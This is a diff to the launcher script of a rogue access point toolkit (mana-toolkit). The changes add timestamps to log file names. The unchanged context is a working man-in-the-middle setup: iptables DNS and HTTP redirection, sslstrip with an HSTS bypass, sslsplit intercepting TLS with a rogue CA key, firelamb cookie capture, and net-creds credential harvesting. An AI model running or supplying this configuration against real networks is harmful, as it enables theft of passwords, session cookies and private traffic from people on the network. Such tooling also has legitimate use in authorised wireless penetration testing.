@@ -37,14 +37,14 @@ iptables -t nat -A PREROUTING -i $phy -p udp --dport 53 -j DNAT --to 10.0.0.1
 
 #SSLStrip with HSTS bypass
 cd /usr/share/mana-toolkit/sslstrip-hsts/sslstrip2/
-python sslstrip.py -l 10000 -a -w /var/lib/mana-toolkit/sslstrip.log&
+python sslstrip.py -l 10000 -a -w /var/lib/mana-toolkit/sslstrip.log.`date "+%s"`&
 iptables -t nat -A PREROUTING -i $phy -p tcp --destination-port 80 -j REDIRECT --to-port 10000
 cd /usr/share/mana-toolkit/sslstrip-hsts/dns2proxy/
 python dns2proxy.py -i $phy&
 cd -
 
 #SSLSplit
-sslsplit -D -P -Z -S /var/lib/mana-toolkit/sslsplit -c /usr/share/mana-toolkit/cert/rogue-ca.pem -k /usr/share/mana-toolkit/cert/rogue-ca.key -O -l /var/lib/mana-toolkit/sslsplit-connect.log \
+sslsplit -D -P -Z -S /var/lib/mana-toolkit/sslsplit -c /usr/share/mana-toolkit/cert/rogue-ca.pem -k /usr/share/mana-toolkit/cert/rogue-ca.key -O -l /var/lib/mana-toolkit/sslsplit-connect.log.`date "+%s"` \
  https 0.0.0.0 10443 \
  http 0.0.0.0 10080 \
  ssl 0.0.0.0 10993 \
@@ -85,7 +85,7 @@ iptables -t nat -A PREROUTING -i $phy \
 /usr/share/mana-toolkit/firelamb/firelamb.py -i $phy &
 
 # Start net-creds
-python /usr/share/mana-toolkit/net-creds/net-creds.py -i $phy >> /var/lib/mana-toolkit/net-creds.log
+python /usr/share/mana-toolkit/net-creds/net-creds.py -i $phy > /var/lib/mana-toolkit/net-creds.log.`date "+%s"`
 
 echo "Hit enter to kill me"
 read
